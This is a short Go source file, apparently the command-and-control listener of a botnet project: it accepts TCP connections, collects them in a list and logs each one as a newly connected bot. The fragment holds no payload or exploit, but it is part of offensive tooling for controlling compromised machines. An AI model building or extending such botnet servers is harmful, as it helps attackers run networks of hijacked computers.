package server

import (
	"homo/network/config"
	"net"
	"os"

	"github.com/fatih/color"
)

var (
	Conns  []net.Conn
	Chconn = make(chan net.Conn)
)

func StartServer(c *config.Config) {
	server, err := net.Listen("tcp", c.Bot.Server+":"+c.Bot.Port)
	if err != nil {
		color.HiRed("Fails to start server")
		os.Exit(0)
	}
	go Ping()

	go func() {
		for {
			conn, err := server.Accept()

			if err != nil {
				continue
			}
			Chconn <- conn
		}
	}()

	for {
		select {
		case conn := <-Chconn:
			Conns = append(Conns, conn)
			color.HiYellow("[!] New bot connected")
			// if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
			// 	newbot(addr.String())
			// }

		}
	}

}
